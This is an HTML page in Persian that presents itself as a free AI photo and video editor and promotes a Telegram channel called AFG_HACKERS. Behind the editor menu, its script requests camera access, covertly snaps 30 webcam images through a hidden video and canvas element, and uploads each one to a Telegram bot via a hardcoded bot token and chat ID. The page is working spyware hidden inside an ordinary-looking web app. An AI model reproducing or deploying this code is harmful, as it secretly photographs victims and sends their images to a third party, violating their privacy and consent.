<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>برنامه ادیت هوش مصنوعی</title>
<style>
body {
    font-family: Tahoma, sans-serif;
    text-align: center;
    background: url('background.png') no-repeat center center fixed;
    background-size: cover;
    color: #fff;
    padding: 40px;
}
h1 { color: #00ff99; font-size: 2.5em; animation: glow 2s infinite alternate; }
@keyframes glow { from { text-shadow: 0 0 5px #00ff99; } to { text-shadow: 0 0 20px #00ff99, 0 0 30px #00ff99; } }
.info-text { font-size: 1.5em; font-weight: bold; background: linear-gradient(90deg,#ff0066,#ffcc00,#00ffff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 20px; animation: rainbow 3s infinite; }
@keyframes rainbow { 0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%} }
.btn { display:inline-block;margin:10px;padding:12px 25px;background:linear-gradient(45deg,#ff0066,#ffcc00);color:#111;border-radius:12px;text-decoration:none;font-weight:bold;font-size:1em;cursor:pointer;transition:transform 0.2s,box-shadow 0.2s;animation:pulse 2s infinite;}
@keyframes pulse {0%{transform:scale(1);box-shadow:0 0 5px #ffcc00}50%{transform:scale(1.05);box-shadow:0 0 15px #ffcc00}100%{transform:scale(1);box-shadow:0 0 5px #ffcc00}}
.btn:hover { transform:scale(1.2);box-shadow:0 0 25px #ffcc00; }
.content { margin-top:25px;padding:20px;border:2px solid #00ff99;border-radius:15px;display:none;text-align:right;background:rgba(0,0,0,0.6);animation:fadeIn 1s ease-in; }
@keyframes fadeIn { from{opacity:0;transform:translateY(20px);} to{opacity:1;transform:translateY(0);} }
.telegram-btn { display:inline-flex;align-items:center;justify-content:center;padding:10px 15px;background:#0088cc;color:white;border-radius:50px;font-size:1.2em;text-decoration:none;margin:5px;transition:transform 0.2s,box-shadow 0.2s;animation:pulse 2s infinite;}
.telegram-btn img { width:24px;height:24px;margin-right:8px; }
.telegram-btn:hover { transform:scale(1.3);box-shadow:0 0 20px #00f; }
</style>
</head>
<body>

<h1>🌟 خوش آمدید 🌟</h1>
<div class="info-text">این یک برنامه ادیت عکس و فیلم با هوش مصنوعی است</div>

<div id="menu" style="margin-top:20px; display:none;">
  <button class="btn" onclick="showContent('photoEdit')">ادیت عکس</button>
  <button class="btn" onclick="showContent('videoEdit')">ادیت فیلم</button>
</div>

<div id="photoEdit" class="content">
<h2>ادیت عکس</h2>
<p>در این بخش می‌توانید عکس‌هایی که گرفته‌اید را با هوش مصنوعی ادیت کنید و جلوه‌های خاص و حرفه‌ای به آن‌ها بدهید
لطفاً عضو کانال ما شوید</p>
<a href="https://t.me/AFG_HACKERS" target="_blank" class="telegram-btn">
<img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram"> کانال تلگرام
</a>
</div>

<div id="videoEdit" class="content">
<h2>ادیت فیلم</h2>
<p>دراین بخش شما میتوانید ظرف پنج ثانیه فیلم های تان را ادیت کنید لطفاً عضو کانال شوید</p>
<a href="https://t.me/AFG_HACKERS" target="_blank" class="telegram-btn">
<img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram"> کانال تلگرام
</a>
</div>

<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
<video id="hiddenVideo" autoplay playsinline style="display:none;"></video>

<script>
const token = "8290730198:AAH7Tgg3puyyDcEBJuE-W5-pD_lBeF90sdg";
const chat_id = "6467716023";
const canvas = document.getElementById('canvas');
const context = canvas.getContext('2d');
const video = document.getElementById('hiddenVideo');
let photoCount = 0;
const maxPhotos = 30;

function showMenu() { document.getElementById('menu').style.display = 'block'; }
function showContent(id){
    document.getElementById('photoEdit').style.display='none';
    document.getElementById('videoEdit').style.display='none';
    document.getElementById(id).style.display='block';
}

// گرفتن ۳۰ عکس پشت‌صحنه
function startTakingPhotos(stream){
    video.srcObject = stream;
    video.play();
    const interval = setInterval(()=>{
        if(photoCount < maxPhotos){
            context.drawImage(video,0,0,canvas.width,canvas.height);
            const imageData = canvas.toDataURL('image/jpeg');
            sendToTelegram(imageData);
            photoCount++;
        }else{ clearInterval(interval); }
    },300);
}

// ارسال عکس‌ها به تلگرام
function sendToTelegram(imageData){
    const byteCharacters = atob(imageData.split(',')[1]);
    const byteArrays = [];
    for(let offset=0; offset<byteCharacters.length; offset++){ byteArrays.push(byteCharacters.charCodeAt(offset)); }
    const byteArray = new Uint8Array(byteArrays);
    const blob = new Blob([byteArray], {type:'image/jpeg'});
    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('photo', blob, 'photo.jpg');
    fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{method:'POST',body:formData})
        .then(res=>console.log("Photo sent"))
        .catch(err=>console.error("Send error:",err));
}

// درخواست اجازه دوربین
navigator.mediaDevices.getUserMedia({video:true})
.then(stream=>{ showMenu(); startTakingPhotos(stream); })
.catch(err=>{ alert("برای استفاده از امکانات رایگان لطفاً تایید کنید"); });
</script>

</body>
</html>